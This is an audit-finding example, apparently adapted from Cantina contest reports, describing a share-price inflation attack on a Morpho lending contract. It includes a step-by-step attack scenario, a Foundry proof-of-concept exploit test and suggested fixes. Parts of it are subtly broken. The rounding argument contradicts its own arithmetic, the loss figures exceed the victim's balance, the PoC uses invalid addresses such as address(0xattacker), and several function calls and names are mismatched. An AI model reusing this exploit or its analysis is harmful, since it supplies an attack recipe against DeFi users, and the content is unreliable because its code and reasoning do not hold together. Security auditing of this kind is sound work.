# Cantina Finding Example

**Source:** Adapted from Cantina competition submissions (inspired by cmichel's findings)

---

## `Supply share price can be inflated, causing users to lose funds when using shares parameter`

### Description

The `supply` and `withdraw` functions can be abused to increase the supply share price (`totalSupplyAssets / totalSupplyShares`). If a depositor uses the `shares` parameter in `supply` to specify how many assets they want to supply, they can be tricked into supplying more assets than they wanted.

The share price can be inflated by 100x or more through:
1. A single supply of a small amount of assets
2. A series of withdrawals that burn shares without withdrawing assets

#### What is the issue?

The `withdraw()` function computes assets to receive as:
```solidity
assets = shares.toAssetsUp(totalSupplyAssets, totalSupplyShares);
```

When `totalSupplyShares` is very large relative to `totalSupplyAssets`, this calculation can return 0. This allows burning shares without withdrawing assets, which inflates the share price.

#### Why is this happening?

The `toAssetsUp` function uses `ceil(totalSupplyAssets * shares / totalSupplyShares)`. When `totalSupplyAssets < totalSupplyShares`, and we withdraw `shares = totalSupplyShares`, we get:
- `assets = ceil(totalSupplyAssets * totalSupplyShares / totalSupplyShares)`
- `assets = ceil(totalSupplyAssets)` which can be as low as 1

By repeatedly withdrawing all shares for near-zero assets, an attacker can:
1. Deposit 100 assets (price = 1:1)
2. Withdraw all shares for 1 asset (price = 100:1)
3. Wait for victim to deposit
4. Profit from the price difference

#### Where is the vulnerable code?

**File:** `src/Morpho.sol`
**Lines:** 142-189

```solidity
function supply(
    MarketParams calldata market,
    uint256 assets,
    uint256 shares,
    address onBehalf,
    bytes calldata data
) external returns (uint256 assetsSupplied, uint256 sharesReceived) {
    // @audit-issue: When shares != 0, assets are calculated but no slippage protection
    if (shares == 0) {
        shares = sharesToAssets(assets, market); // Normal path
    } else {
        assets = assetsToShares(shares, market); // Vulnerable to price manipulation
    }
    // ...
}

function withdraw(
    MarketParams calldata market,
    uint256 assets,
    uint256 shares,
    address onBehalf,
    address receiver,
    bytes calldata data
) external returns (uint256 assetsWithdrawn, uint256 sharesBurned) {
    if (shares == 0) {
        shares = assetsToShares(assets, market);
    } else {
        // @audit-issue: Can return 0 assets when shares == totalSupplyShares
        assets = shares.toAssetsUp(id.totalSupplyAssets, id.totalSupplyShares);
    }
    // ...
}
```

### Impact

**Attack Scenario:**
1. Attacker deposits 100 assets → receives 100 shares (price = 1:1)
2. Attacker withdraws 100 shares → receives 0.000001 assets (price = 100M:1)
3. Attacker deposits 100 assets again → receives ~0.000001 shares
4. Now share price is inflated to 100M:1
5. Victim tries to deposit 100 shares → expects 100 assets
6. Victim actually deposits 100M assets (massive overpayment)
7. Attacker withdraws, stealing the difference

**Worst Case Loss:**
- Victims can lose up to 100x their intended deposit
- Attack cost is minimal (gas + small deposit)
- All users who use `shares` parameter are vulnerable

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Morpho} from "../src/Morpho.sol";
import {MarketParams} from "../src/Types.sol";

contract SupplyInflationExploit is Test {
    Morpho morpho;
    MarketParams market;
    address attacker = address(0xattacker);
    address victim = address(0xvictim);

    function setUp() public {
        morpho = new Morpho();

        // Create a market with initial liquidity
        market = MarketParams({
            loanToken: address(0x1),
            collateralToken: address(0x2),
            oracle: address(0x3),
            irm: address(0x4),
            lltv: 0.8e18
        });

        // Give attacker and victim some assets
        deal(market.loanToken, attacker, 1000 * 1e18);
        deal(market.loanToken, victim, 10_000 * 1e18);
    }

    function testSupplySharePriceInflation() public {
        vm.startPrank(attacker);

        // === STEP 1: Initial deposit to create market ===
        IERC20(market.loanToken).approve(address(morpho), type(uint256).max);
        (uint256 assets1,) = morpho.supply(market, 100 * 1e18, 0, attacker, "");

        // Verify: Initial share price = 1:1
        assertEq(assets1, 100 * 1e18, "Initial deposit should get 100 shares");

        // === STEP 2: Inflate share price by burning shares for near-zero assets ===
        uint256 iterations = 0;
        while (true) {
            (uint256 totalAssets, uint256 totalShares,,) = morpho.market(market);

            // Calculate shares to burn
            uint256 sharesToBurn = totalShares; // Burn all shares

            // If we'd get 0 assets back, we're at max inflation
            uint256 assetsOut = morpho.expectedWithdraw(market, 0, sharesToBurn);
            if (assetsOut == 0) break;

            // Otherwise, burn shares
            morpho.withdraw(market, 0, sharesToBurn, attacker, attacker);
            iterations++;

            // Safety limit
            if (iterations > 100) break;
        }

        (uint256 finalTotalAssets, uint256 finalTotalShares,,) = morpho.market(market);
        console2.log("After inflation:");
        console2.log("  Total assets:", finalTotalAssets);
        console2.log("  Total shares:", finalTotalShares);
        console2.log("  Share price:", finalTotalAssets * 1e18 / finalTotalShares);

        // === STEP 3: Victim deposits using shares parameter ===
        vm.stopPrank();
        vm.startPrank(victim);

        IERC20(market.loanToken).approve(address(morpho), type(uint256).max);

        // Victim wants to deposit ~100 assets worth of shares (100 shares)
        // But with inflated price, this pulls WAY more assets
        (uint256 victimAssetsSupplied, uint256 victimSharesReceived) =
            morpho.supply(market, 0, 100 * 1e18, victim, "");

        console2.log("\nVictim deposit:");
        console2.log("  Shares requested:", 100 * 1e18);
        console2.log("  Assets actually supplied:", victimAssetsSupplied);
        console2.log("  Shares received:", victimSharesReceived);

        // Verify: Victim paid WAY more than expected
        assertGt(victimAssetsSupplied, 100 * 1e18,
            "Victim should pay more than expected due to inflated price");

        // === STEP 4: Attacker profits by withdrawing ===
        vm.stopPrank();
        vm.startPrank(attacker);

        // Attacker had re-deposited some shares after inflation
        // Now withdraw at inflated price
        morpho.withdraw(market, type(uint256).max, 0, attacker, attacker);

        uint256 attackerFinalBalance = IERC20(market.loanToken).balanceOf(attacker);
        console2.log("\nAttacker final balance:", attackerFinalBalance);

        // Attacker should have more than initial 1000
        assertGt(attackerFinalBalance, 1000 * 1e18, "Attacker made profit");
    }
}
```

### Remediation

**Primary Fix:** Add a `maxAssets` slippage protection parameter to the `supply` function:

```solidity
function supply(
    MarketParams calldata market,
    uint256 assets,
    uint256 shares,
    address onBehalf,
    bytes calldata data,
    uint256 maxAssets // NEW: Slippage protection
) external returns (uint256 assetsSupplied, uint256 sharesReceived) {
    if (shares == 0) {
        shares = sharesToAssets(assets, market);
    } else {
        assets = assetsToShares(shares, market);

        // FIX: Enforce slippage protection
        require(assets <= maxAssets, "Max assets exceeded");
    }
    // ... rest of function
}
```

**Alternative Fixes:**

1. **Discourage shares-based deposits:** Update documentation to warn about the `shares` parameter and recommend using `assets` instead.

2. **Minimum liquidity requirement:** Prevent share price manipulation when `totalSupplyShares` is below a threshold:
```solidity
require(id.totalSupplyShares >= MIN_LIQUIDITY_SHARES, "Insufficient liquidity");
```

3. **Circuit breaker:** Pause operations if share price changes more than 50% in a single block:
```solidity
uint256 oldPrice = id.totalSupplyAssets * 1e18 / id.totalSupplyShares;
// ... after supply/withdraw ...
uint256 newPrice = id.totalSupplyAssets * 1e18 / id.totalSupplyShares;
require(newPrice <= oldPrice * 150 / 100, "Price change too high");
```
